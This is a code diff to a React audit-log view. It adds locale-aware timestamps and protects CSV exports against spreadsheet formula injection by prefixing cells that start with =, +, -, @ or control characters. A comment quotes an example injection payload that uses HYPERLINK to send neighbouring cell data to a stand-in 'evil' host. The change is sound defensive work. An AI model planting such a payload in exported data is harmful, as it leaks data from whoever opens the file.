@@ -15,7 +15,7 @@ import Select from '@nodate-flow/ui/primitives/select';
 import { type ChangeEvent, type ReactElement, useState } from 'react';
 import { useTranslation } from 'react-i18next';
 
-import { formatDate } from '../../lib/format';
+import { formatDate, formatEpochDateTime } from '../../lib/format';
 import { useWeekStart } from '../../lib/use-week-start';
 import { type AuditLogEntry, type AuditLogFilters, useAuditLogsQuery } from './api';
 
@@ -127,27 +127,52 @@ function toneForAction(action: string): 'accent' | 'warning' | 'danger' | 'neutr
   return 'neutral';
 }
 
-function formatTimestamp(unix: number): string {
-  return new Date(unix * 1000).toLocaleString();
-}
-
 function formatMetadata(meta: unknown): string {
   if (!meta) return '';
   return JSON.stringify(meta);
 }
 
-function escapeCsvField(value: string): string {
-  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
-    return `"${value.replace(/"/g, '""')}"`;
-  }
-  return value;
+/**
+ * Characters a spreadsheet reads as "this cell is an expression" when
+ * one of them is the first character in the cell.
+ */
+const FORMULA_LEADERS = ['=', '+', '-', '@', '\t', '\r'];
+
+/**
+ * Stop a cell from being executed as a formula by whatever opens the
+ * file.
+ *
+ * An audit row carries names and metadata that people chose, so a
+ * display name of `=HYPERLINK("http://evil/?"&A1,"x")` sits in the log
+ * until an administrator exports it and opens the result, at which
+ * point it runs and can send the surrounding cells somewhere else
+ * (CWE-1236).
+ *
+ * Quoting does not prevent this even though the escaping below already
+ * quotes anything with a comma in it: the parser removes the quotes,
+ * and the spreadsheet then sees a value starting with the same
+ * character it always did. The apostrophe is what spreadsheets
+ * themselves document, and it matches what the server's task export
+ * writes.
+ */
+function neutraliseFormula(value: string): string {
+  if (value.length === 0 || !FORMULA_LEADERS.includes(value[0] as string)) return value;
+  return `'${value}`;
 }
 
-function buildCsv(entries: AuditLogEntry[], headers: readonly string[]): string {
+function escapeCsvField(value: string): string {
+  const safe = neutraliseFormula(value);
+  if (safe.includes(',') || safe.includes('"') || safe.includes('\n')) {
+    return `"${safe.replace(/"/g, '""')}"`;
+  }
+  return safe;
+}
+
+function buildCsv(entries: AuditLogEntry[], headers: readonly string[], locale: string): string {
   const headerLine = headers.map(escapeCsvField).join(',');
   const rows = entries.map((e) =>
     [
-      formatTimestamp(e.occurredAt),
+      formatEpochDateTime(e.occurredAt, locale) ?? '',
       e.action,
       e.actorDisplayName ?? '',
       e.resourceType,
@@ -161,8 +186,12 @@ function buildCsv(entries: AuditLogEntry[], headers: readonly string[]): string 
   return `${headerLine}\n${rows.join('\n')}`;
 }
 
-function handleExportCsv(entries: AuditLogEntry[], headers: readonly string[]): void {
-  const csv = buildCsv(entries, headers);
+function handleExportCsv(
+  entries: AuditLogEntry[],
+  headers: readonly string[],
+  locale: string,
+): void {
+  const csv = buildCsv(entries, headers, locale);
   const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
@@ -172,7 +201,7 @@ function handleExportCsv(entries: AuditLogEntry[], headers: readonly string[]): 
   URL.revokeObjectURL(url);
 }
 
-function AuditRow({ entry }: { entry: AuditLogEntry }): ReactElement {
+function AuditRow({ entry, locale }: { entry: AuditLogEntry; locale: string }): ReactElement {
   const { t } = useTranslation('settings');
   return (
     <tr>
@@ -184,7 +213,7 @@ function AuditRow({ entry }: { entry: AuditLogEntry }): ReactElement {
           color: 'var(--nf-color-fg-muted)',
         }}
       >
-        {formatTimestamp(entry.occurredAt)}
+        {formatEpochDateTime(entry.occurredAt, locale)}
       </td>
       <td style={{ padding: 'var(--nf-space-2) var(--nf-space-3)' }}>
         <Badge tone={toneForAction(entry.action)}>{entry.action}</Badge>
@@ -331,7 +360,7 @@ export default function AuditLogView({ workspaceId }: { workspaceId: string }): 
   ] as const;
 
   const handleExport = (): void => {
-    handleExportCsv(data.entries, csvHeaders);
+    handleExportCsv(data.entries, csvHeaders, locale);
   };
 
   return (
@@ -581,7 +610,7 @@ export default function AuditLogView({ workspaceId }: { workspaceId: string }): 
             </thead>
             <tbody>
               {data.entries.map((entry) => (
-                <AuditRow key={entry.publicId} entry={entry} />
+                <AuditRow key={entry.publicId} entry={entry} locale={locale} />
               ))}
             </tbody>
           </table>
